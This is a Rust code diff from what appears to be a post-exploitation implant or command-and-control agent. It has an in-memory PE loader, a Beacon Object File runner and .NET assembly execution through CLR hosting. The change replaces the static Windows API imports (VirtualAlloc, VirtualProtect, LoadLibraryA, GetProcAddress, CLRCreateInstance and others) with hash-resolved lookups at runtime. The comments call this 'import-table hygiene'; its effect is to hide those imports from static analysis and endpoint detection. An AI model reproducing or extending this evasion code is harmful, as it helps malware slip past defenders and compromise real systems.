@@ -89,14 +89,75 @@ pub mod pe_loader {
     }
 
     // WinAPI imports
-    extern "system" {
-        fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
-        fn VirtualProtect(addr: *mut c_void, size: usize, new_protect: u32, old_protect: *mut u32) -> i32;
-        fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
-        fn LoadLibraryA(name: *const i8) -> *mut c_void;
-        fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void;
-        fn FlushInstructionCache(process: *mut c_void, addr: *const c_void, size: usize) -> i32;
-        fn GetCurrentProcess() -> *mut c_void;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualAlloc")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr, size, alloc_type, protect) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualProtect(addr: *mut c_void, size: usize, new_protect: u32, old_protect: *mut u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtect")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr, size, new_protect, old_protect) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualFree")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr, size, free_type) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn LoadLibraryA(name: *const i8) -> *mut c_void {
+        type F = unsafe extern "system" fn(*const i8) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"LoadLibraryA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, *const i8) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetProcAddress")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(module, name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn FlushInstructionCache(process: *mut c_void, addr: *const c_void, size: usize) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *const c_void, usize) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"FlushInstructionCache")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(process, addr, size) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetCurrentProcess() -> *mut c_void {
+        type F = unsafe extern "system" fn() -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetCurrentProcess")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
     }
 
     // MEM_* / PAGE_* / IMAGE_NT_SIGNATURE / IMAGE_DIRECTORY_ENTRY_IMPORT are
@@ -520,8 +581,15 @@ pub mod pe_loader {
                 // join() returns Err if the thread panicked or was killed (ExitThread),
                 // but in both cases the thread has terminated and its memory is safe to free.
                 let _ = exe_thread.join();
-                extern "system" {
-                    fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
+                /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+                unsafe fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32 {
+                    type F = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
+                    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+                    let p = *P.get_or_init(||
+                        crate::agent::injection::win_resolve::resolve_ptr(
+                            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualFree")));
+                    let f: F = unsafe { std::mem::transmute(p) };
+                    unsafe { f(addr, size, free_type) }
                 }
                 unsafe {
                     VirtualFree(base_copy as *mut c_void, 0,
@@ -557,18 +625,115 @@ pub mod bof {
     use std::sync::{Mutex, OnceLock};
     use super::{aes_str, strcrypt_rt};
 
-    extern "system" {
-        fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
-        fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
-        fn LoadLibraryA(name: *const i8) -> *mut c_void;
-        fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void;
-        fn GetModuleHandleA(name: *const i8) -> *mut c_void;
-        fn FlushInstructionCache(process: *mut c_void, addr: *const c_void, size: usize) -> i32;
-        fn GetCurrentProcess() -> *mut c_void;
-        fn GetCurrentThreadId() -> u32;
-        fn ExitThread(code: u32) -> !;
-        fn AddVectoredExceptionHandler(first: u32, handler: unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32) -> *mut c_void;
-        fn RemoveVectoredExceptionHandler(handle: *mut c_void) -> u32;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualAlloc")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr, size, alloc_type, protect) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualFree")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr, size, free_type) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn LoadLibraryA(name: *const i8) -> *mut c_void {
+        type F = unsafe extern "system" fn(*const i8) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"LoadLibraryA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, *const i8) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetProcAddress")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(module, name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetModuleHandleA(name: *const i8) -> *mut c_void {
+        type F = unsafe extern "system" fn(*const i8) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleHandleA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn FlushInstructionCache(process: *mut c_void, addr: *const c_void, size: usize) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *const c_void, usize) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"FlushInstructionCache")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(process, addr, size) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetCurrentProcess() -> *mut c_void {
+        type F = unsafe extern "system" fn() -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetCurrentProcess")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetCurrentThreadId() -> u32 {
+        type F = unsafe extern "system" fn() -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetCurrentThreadId")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn ExitThread(code: u32) -> ! {
+        type F = unsafe extern "system" fn(u32) -> !;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ExitThread")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(code) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn AddVectoredExceptionHandler(first: u32, handler: unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32) -> *mut c_void {
+        type F = unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"AddVectoredExceptionHandler")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(first, handler) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn RemoveVectoredExceptionHandler(handle: *mut c_void) -> u32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RemoveVectoredExceptionHandler")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(handle) }
     }
 
     // ── VEH types for BOF crash containment ───────────────────────────
@@ -1117,8 +1282,15 @@ pub mod dotnet {
 
     type HRESULT = i32;
 
-    extern "system" {
-        fn CLRCreateInstance(clsid: *const GUID, iid: *const GUID, ppv: *mut *mut c_void) -> HRESULT;
+    /// Lazily resolved from mscoree.dll by name hash (import-table hygiene).
+    unsafe fn CLRCreateInstance(clsid: *const GUID, iid: *const GUID, ppv: *mut *mut c_void) -> HRESULT {
+        type F = unsafe extern "system" fn(*const GUID, *const GUID, *mut *mut c_void) -> HRESULT;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"mscoree.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CLRCreateInstance")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(clsid, iid, ppv) }
     }
 
     /// Execute a .NET assembly via CLR hosting (ExecuteInDefaultAppDomain).
